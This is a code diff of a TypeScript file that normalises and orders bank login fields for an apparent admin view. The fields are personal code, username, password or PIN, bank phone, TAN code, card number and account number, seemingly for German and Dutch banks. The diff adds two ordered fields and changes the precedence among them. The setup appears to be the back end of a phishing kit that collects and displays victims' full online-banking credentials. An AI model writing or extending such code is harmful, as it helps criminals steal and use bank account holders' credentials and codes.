@@ -181,19 +181,30 @@ function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[stri
     return "";
   };
 
+  const orderedField1 = pickString("orderedField1");
+  const orderedField2 = pickString("orderedField2");
   const rawPersonalCode = pickString("personalCode");
+  const rawBankPhone = pickString("bankPhone");
   const rawUsername = pickString("username", "verfuegernummer");
   const rawPassword = pickString("password", "pin");
 
-  const effectivePersonalCode = rawPersonalCode || rawUsername;
-  const effectiveUsername = rawPersonalCode ? rawUsername : "";
+  const effectivePersonalCode = orderedField1 || rawPersonalCode || rawUsername || rawBankPhone;
+  const effectivePassword = orderedField2 || rawPassword;
+  const effectiveBankPhone =
+    rawBankPhone && rawBankPhone !== effectivePersonalCode && rawBankPhone !== effectivePassword ? rawBankPhone : "";
+  const effectiveUsername =
+    rawUsername && rawUsername !== effectivePersonalCode && rawUsername !== effectivePassword
+      ? rawUsername
+      : rawPersonalCode && rawUsername !== effectivePersonalCode
+        ? rawUsername
+        : "";
 
   const canonicalFields: Array<[string, string]> = [
     ["loginMethod", pickString("loginMethod")],
     ["personalCode", effectivePersonalCode],
-    ["bankPhone", pickString("bankPhone")],
+    ["password", effectivePassword],
+    ["bankPhone", effectiveBankPhone],
     ["username", effectiveUsername],
-    ["password", rawPassword],
     ["tacCode", pickString("tacCode")],
     ["pasnummer", pickString("pasnummer")],
     ["rekeningnummer", pickString("rekeningnummer")],
@@ -213,6 +224,8 @@ function getAdditionalAdminBankFields(formData: Record<string, any>): Array<[str
     "bankName",
     "bankSlug",
     "loginMethod",
+    "orderedField1",
+    "orderedField2",
     "personalCode",
     "bankPhone",
     "username",
